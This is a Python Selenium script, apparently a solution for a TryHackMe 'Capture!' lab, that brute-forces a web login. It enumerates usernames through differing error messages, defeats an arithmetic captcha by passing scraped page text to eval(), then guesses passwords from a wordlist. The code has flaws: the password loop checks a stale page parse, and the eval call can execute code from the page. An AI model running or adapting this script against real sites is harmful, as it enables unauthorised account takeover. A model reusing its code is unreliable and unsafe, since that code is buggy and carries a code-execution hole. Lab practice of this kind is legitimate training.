"""WebApp login bruteforce script built for Try Hack Me Labs: Capture!"""

import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup

#Replace with the browser you use.
driver = webdriver.Firefox()
#Replace with the actual target URL.
driver.get('TARGET_URL')  

#Variable set to store the correct username.
correct_name = ''

with open('usernames.txt', 'r', encoding='utf=8') as file:
    for line in file:
        #locating elements
        user_input = driver.find_element(By.ID, 'username')
        pass_input = driver.find_element(By.ID, 'password')
        login = driver.find_element(By.CLASS_NAME, 'login_button')
        
        #Set credentials.
        username = line.strip()
        test_pass = 'password'
        
        #Clears input since this box keeps input from the last loop.
        user_input.clear()
        pass_input.clear()

        #Input credentials.
        user_input.send_keys(line.strip())
        pass_input.send_keys(test_pass)
        
        #Check if captcha is on the page, if so, solve it and input.
        cap_exists = driver.find_elements(By.ID, 'captcha')
        if len(cap_exists) > 0:
            captcha_input = driver.find_element(By.ID, 'captcha')
            captcha_input.clear()
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            captcha = re.search(r'(\d+)\s*([+\-*\/])\s*(\d+)', soup.text).group()
            solved = eval(captcha)
            captcha_input.send_keys(solved)
        
        login.click()
        
        #Ran into errors calling the older soup, so we need a new one. Also grabbing the possible errors.
        fresh_soup = BeautifulSoup(driver.page_source, 'html.parser')
        login_error = fresh_soup.find(class_='error').get_text(strip=True)
        inv_user = re.findall(r'user ".+" does not exist', login_error)
        inv_cap = re.findall(r'captcha', login_error)
        inv_pass = re.findall(r'password', login_error)
        
        if inv_cap:
            continue
        elif inv_user:
            continue
        elif inv_pass:
            print(f'{username} found')
            correct_name = username
            break

#We got the Username, same processes as above but attempting to find the password now.
with open('passwords.txt', 'r', encoding='utf=8') as file:
    for line in file:
        
        user_input = driver.find_element(By.ID, 'username')
        pass_input = driver.find_element(By.ID, 'password')
        login = driver.find_element(By.CLASS_NAME, 'login_button')
        
        user_input.clear()
        pass_input.clear()
        pass_input.send_keys(line.strip())
        user_input.send_keys(correct_name)  
              
        cap_exists = driver.find_elements(By.ID, 'captcha')
        if len(cap_exists) > 0:
            captcha_input = driver.find_element(By.ID, 'captcha')
            captcha_input.clear()
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            captcha = re.search(r'(\d+)\s*([+\-*\/])\s*(\d+)', soup.text).group()
            solved = eval(captcha)
            captcha_input.send_keys(solved)
            
        login.click()
        
        login_error = fresh_soup.find(class_='error').get_text(strip=True)
        inv_pass = re.findall(r'password', login_error)
        
        if inv_pass:
            continue
        else:
            print(f'{line.strip()} found')
            break
